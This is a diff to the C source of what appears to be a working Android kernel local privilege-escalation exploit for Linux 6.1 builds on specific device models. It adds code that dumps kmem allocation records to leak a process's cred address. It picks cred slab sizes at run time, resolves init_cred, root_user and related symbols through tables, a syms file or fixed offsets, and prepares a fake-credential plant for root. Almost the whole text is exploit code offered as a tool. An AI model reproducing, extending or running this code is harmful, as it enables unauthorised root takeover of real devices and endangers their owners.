@@ -452,6 +452,105 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
     return found;
 }
 
+/*
+ * Per-build measurement helpers.  The cred/task scans above filter on the
+ * profile's slab sizes (CRED_REQ / CRED_ALLOC / TASK_ALLOC_BYTES).  On a
+ * build whose kernel config differs from the profile's reference device
+ * (e.g. PD2456 16.1.17.5 vs the PD2571 profile) those filters match nothing
+ * and the run stops at "cred leak failed" before any write has happened.
+ * collect_kmem() dumps the raw kmem records seen for a pid so the real
+ * sizes can be read straight off the log; adapt_cred_pair() can optionally
+ * pick the cred allocation at run time when the operator opts in with
+ * IC_ADAPT_CRED=1 or by creating /data/local/tmp/ic-adapt-cred.
+ */
+struct kmem_rec_info
+{
+    unsigned long long site, ptr, req, alloc;
+    int n;
+};
+
+static int collect_kmem(const unsigned char *b, size_t n, int pid,
+                        struct kmem_rec_info *out, int max)
+{
+    int cnt = 0;
+
+    for (size_t i = 8; i + 32 <= n; i += 4)
+    {
+        unsigned long long site, ptr, req, alloc;
+        int k;
+
+        if (u32(b, i - 4) != (unsigned)pid)
+            continue;
+        site = u64(b, i);
+        if (!is_kernel_ptr(site))
+            continue;
+        ptr = u64(b, i + 8);
+        req = u64(b, i + 16);
+        alloc = u64(b, i + 24);
+        for (k = 0; k < cnt; k++)
+            if (out[k].req == req && out[k].alloc == alloc &&
+                (out[k].site & 0x1fffffULL) == (site & 0x1fffffULL))
+            {
+                out[k].n++;
+                break;
+            }
+        if (k < cnt || cnt >= max)
+            continue;
+        out[cnt].site = site;
+        out[cnt].ptr = ptr;
+        out[cnt].req = req;
+        out[cnt].alloc = alloc;
+        out[cnt].n = 1;
+        cnt++;
+    }
+    return cnt;
+}
+
+static int adapt_requested(const char *env, const char *flagfile)
+{
+    const char *v = getenv(env);
+
+    if (v && *v && strcmp(v, "0"))
+        return 1;
+    {
+        FILE *f = fopen(flagfile, "r");
+
+        if (f)
+        {
+            fclose(f);
+            return 1;
+        }
+    }
+    return 0;
+}
+
+/* Pick the cred_jar (bytes_req, bytes_alloc) pair out of the child's exec
+ * records without hardcoding the profile's sizes.  cred_jar sizes across
+ * known 6.1 builds sit in [0xa0, 0xd8] with at most an 8-byte slab
+ * round-up; a kmalloc-256 linux_binprm record (alloc 0x100) and every
+ * other exec-path cache fall outside the window.  Returns the number of
+ * distinct pairs inside the window: the caller only proceeds on exactly
+ * one, and a second distinct call site for the same window also counts as
+ * a refusal. */
+static int pick_cred_pair(const struct kmem_rec_info *recs, int nr,
+                          unsigned long long *req_out,
+                          unsigned long long *alloc_out)
+{
+    int cand = 0;
+
+    for (int i = 0; i < nr; i++)
+        if (recs[i].req >= 0xa0 && recs[i].req <= 0xd8 &&
+            recs[i].alloc >= recs[i].req &&
+            recs[i].alloc - recs[i].req <= 8 &&
+            (recs[i].alloc & 7) == 0)
+        {
+            cand++;
+            *req_out = recs[i].req;
+            *alloc_out = recs[i].alloc;
+        }
+    return cand;
+}
+
 static int scan_page_free(const unsigned char *b, size_t n,
                           unsigned long long pfn)
 {
@@ -2190,6 +2289,76 @@ static unsigned long long leak_cred(unsigned char *raw,
             c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
             tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
         }
+        if (!c && n > 0)
+        {
+            struct kmem_rec_info recs[24];
+            int nr;
+
+            /* The exec's cred allocation never matched the profile's cred_jar
+             * sizes.  Show what this build actually allocated for the child
+             * so CRED_REQ / CRED_ALLOC can be pinned from the log, and --
+             * opt-in only -- pick the cred record at run time.  The task
+             * scan below stays dump-only: aiming the fake-cred plant with a
+             * guessed task size would write into a live task_struct. */
+            nr = collect_kmem(raw, (size_t)n, (int)p, recs, 24);
+            if (attempt < 2)
+            {
+                logf("[creddiag] attempt=%d child=%d distinct=%d\n", attempt,
+                     p, nr);
+                for (int i = 0; i < nr; i++)
+                    logf("[creddiag]   req=%#llx alloc=%#llx site_low=%#llx "
+                         "n=%d ptr=%#llx\n", recs[i].req, recs[i].alloc,
+                         recs[i].site & 0x1fffffULL, recs[i].n, recs[i].ptr);
+            }
+            if (adapt_requested("IC_ADAPT_CRED",
+                                "/data/local/tmp/ic-adapt-cred"))
+            {
+                static unsigned long long a_req, a_alloc;
+                static int a_have;
+
+                if (!a_have)
+                {
+                    int cand = pick_cred_pair(recs, nr, &a_req, &a_alloc);
+
+                    if (cand == 1)
+                    {
+                        a_have = 1;
+                        logf("[cred] adaptive pair req=%#llx alloc=%#llx "
+                             "(profile %#llx/%#llx never matched)\n",
+                             a_req, a_alloc, (unsigned long long)CRED_REQ,
+                             (unsigned long long)CRED_ALLOC);
+                    }
+                    else
+                        logf("[cred] adaptive: %d size candidates; refusing "
+                             "(pin CRED_REQ/CRED_ALLOC from creddiag)\n",
+                             cand);
+                }
+                if (a_have)
+                    for (int i = 0; i < nr; i++)
+                        if (recs[i].req == a_req && recs[i].alloc == a_alloc)
+                        {
+                            R = recs[i].ptr;
+                            site = recs[i].site;
+                            c = 1;
+                            break;
+                        }
+            }
+        }
+        if (!tc && n > 0 && g_fake_stage && attempt < 2)
+        {
+            struct kmem_rec_info trecs[24];
+            int tn = collect_kmem(raw, (size_t)n, getpid(), trecs, 24);
+
+            /* The fork's task_struct allocation is recorded under the
+             * parent's pid; its sizes give TASK_ALLOC_BYTES and the
+             * copy_process call site for a per-build profile. */
+            logf("[taskdiag] attempt=%d parent=%d distinct=%d\n", attempt,
+                 getpid(), tn);
+            for (int i = 0; i < tn; i++)
+                logf("[taskdiag]   req=%#llx alloc=%#llx site_low=%#llx "
+                     "n=%d ptr=%#llx\n", trecs[i].req, trecs[i].alloc,
+                     trecs[i].site & 0x1fffffULL, trecs[i].n, trecs[i].ptr);
+        }
         if (R && (!g_fake_stage || task))
         {
             struct pollfd pf = {.fd = st[0], .events = POLLIN};
@@ -3132,6 +3301,24 @@ int main(int argc, char **argv)
          * kallsyms gave us so the vote must stand on its own. */
         g_text_runtime = g_tp_runtime = g_selinux_runtime = 0;
     }
+    {
+        /* The old tool's generated table (if the user pushed one) wins over
+         * the built-in tables: it is the only source for builds we do not
+         * ship, e.g. PD2456 / 16.1.17.5.  Read it BEFORE the anchor block
+         * so its root_user / init_ucounts / init_groups values are not
+         * shadowed by the ns-relative fallbacks below (on PD2456 those
+         * fallbacks collide with the real init_cred). */
+        const char *sf = getenv("IC_SYMS_FILE");
+
+        if (!sf || !*sf)
+            sf = "/data/local/tmp/ic-syms.txt";
+        {
+            int sn = read_syms_file(sf);
+
+            logf("[syms] %s -> %d (tp=%#llx selinux=%#llx)\n", sf, sn,
+                 g_tp_link, g_selinux_link);
+        }
+    }
     if (!g_tp_runtime && !g_text_runtime)
     {
         char bid[160];
@@ -3155,45 +3342,69 @@ int main(int argc, char **argv)
                 g_selinux_link = tab->link[IC_ANCHOR_N - 3];
                 if (!g_init_user_ns_link)
                     g_init_user_ns_link = tab->link[IC_ANCHOR_N - 2];
-                /* The fake-cred objects live at fixed offsets from
-                 * init_user_ns in every build we could verify against an
-                 * image (16.1.11.0, 16.2.11, 16.2.12.0, 16.2.20.7/21.1):
-                 *   root_user    = ns + 0x298
-                 *   init_ucounts = ns + 0x1b48
-                 *   init_groups  = ns + 0x15b8
-                 * Every anchor table carries init_user_ns, so this covers
-                 * builds we never had an image for (deriving a wrong value
-                 * only makes prepare_creds fail with ENOMEM, not panic). */
-                if (!g_root_user_link && g_init_user_ns_link)
-                    g_root_user_link = g_init_user_ns_link + 0x298;
-                if (!g_init_ucounts_link && g_init_user_ns_link)
-                    g_init_ucounts_link = g_init_user_ns_link + 0x1b48;
-                if (!g_init_groups_link && g_init_user_ns_link)
-                    g_init_groups_link = g_init_user_ns_link + 0x15b8;
                 if (!g_init_cred_link)
                     g_init_cred_link = tab->link[IC_ANCHOR_N - 1];
-                /* Fill the fake-cred objects the anchor tables lack, when
-                 * this build's image was available offline. */
+            }
+        }
+        /* Fill the fake-cred objects the anchor tables and the syms file
+         * lack.  Runs even when the table's tp slot was already supplied by
+         * the syms file: the old parser's table carries the four targets
+         * but not root_user / init_ucounts / init_groups. */
+        if (tab)
+        {
+            /* Per-build values, when this build's image was available
+             * offline.  These outrank the ns-relative guesses below. */
+            size_t ei;
+
+            for (ei = 0; ei < sizeof(ic_extra_syms_tab) /
+                              sizeof(ic_extra_syms_tab[0]);
+                 ei++)
+            {
+                const struct ic_extra_syms *xs = &ic_extra_syms_tab[ei];
+
+                if (strcmp(xs->table, tab->name))
+                    continue;
+                if (!g_root_user_link)
+                    g_root_user_link = xs->root_user;
+                if (!g_init_ucounts_link)
+                    g_init_ucounts_link = xs->init_ucounts;
+                if (!g_init_groups_link)
+                    g_init_groups_link = xs->init_groups;
+                break;
+            }
+        }
+        {
+            /* The fake-cred objects live at fixed offsets from
+             * init_user_ns in every build we could verify against an
+             * image (16.1.11.0, 16.2.11, 16.2.12.0, 16.2.20.7/21.1):
+             *   root_user    = ns + 0x298
+             *   init_ucounts = ns + 0x1b48
+             *   init_groups  = ns + 0x15b8
+             * Every anchor table carries init_user_ns, so this covers
+             * builds we never had an image for (deriving a wrong value
+             * only makes prepare_creds fail with ENOMEM, not panic). */
+            if (!g_root_user_link && g_init_user_ns_link)
+                g_root_user_link = g_init_user_ns_link + 0x298;
+            if (!g_init_ucounts_link && g_init_user_ns_link)
+                g_init_ucounts_link = g_init_user_ns_link + 0x1b48;
+            if (!g_init_groups_link && g_init_user_ns_link)
+            {
+                g_init_groups_link = g_init_user_ns_link + 0x15b8;
+                /* cred.c lays the 8-byte init_groups right before
+                 * init_cred on the reference build, so ns+0x15b8 and
+                 * cred-8 are the same address there.  On builds where
+                 * init_cred itself sits at ns+0x15b8 (e.g. PD2456
+                 * 16.1.17.5) the two would collide, which cannot be
+                 * real: prefer cred-8 so the fake cred's group_info
+                 * does not point at init_cred.  Re-parse the boot.img
+                 * with the current tool to get the real symbol
+                 * instead of this guess. */
+                if (g_init_cred_link &&
+                    g_init_groups_link == g_init_cred_link)
                 {
-                    size_t ei;
-
-                    for (ei = 0; ei < sizeof(ic_extra_syms_tab) /
-                                        sizeof(ic_extra_syms_tab[0]);
-                         ei++)
-                    {
-                        const struct ic_extra_syms *xs =
-                            &ic_extra_syms_tab[ei];
-
-                        if (strcmp(xs->table, tab->name))
-                            continue;
-                        if (!g_root_user_link)
-                            g_root_user_link = xs->root_user;
-                        if (!g_init_ucounts_link)
-                            g_init_ucounts_link = xs->init_ucounts;
-                        if (!g_init_groups_link)
-                            g_init_groups_link = xs->init_groups;
-                        break;
-                    }
+                    g_init_groups_link = g_init_cred_link - 8;
+                    logf("[syms] init_groups guess -> cred-8 (ns+0x15b8 "
+                         "collided with init_cred)\n");
                 }
             }
         }
@@ -3219,27 +3430,12 @@ int main(int argc, char **argv)
             }
         }
     }
-    {
-        /* The old tool's generated table (if the user pushed one) wins over
-         * the built-in tables: it is the only source for builds we do not
-         * ship, e.g. PD2425 / 16.1.17.10. */
-        const char *sf = getenv("IC_SYMS_FILE");
-
-        if (!sf || !*sf)
-            sf = "/data/local/tmp/ic-syms.txt";
-        {
-            int sn = read_syms_file(sf);
-
-            logf("[syms] %s -> %d (tp=%#llx selinux=%#llx)\n", sf, sn,
-                 g_tp_link, g_selinux_link);
-            logf("[syms] have ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx"
-                 " (rt ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx)\n",
-                 g_root_user_link, g_init_user_ns_link, g_init_ucounts_link,
-                 g_init_groups_link, g_init_cred_link, g_root_user_rt,
-                 g_init_user_ns_rt, g_init_ucounts_rt, g_init_groups_rt,
-                 g_init_cred_rt);
-        }
-    }
+    logf("[syms] have ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx"
+         " (rt ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx)\n",
+         g_root_user_link, g_init_user_ns_link, g_init_ucounts_link,
+         g_init_groups_link, g_init_cred_link, g_root_user_rt,
+         g_init_user_ns_rt, g_init_ucounts_rt, g_init_groups_rt,
+         g_init_cred_rt);
 
     /* `core info` -- App preflight.  Reports whether this build has usable
      * offsets before anything touches the kernel, so the App can ask the
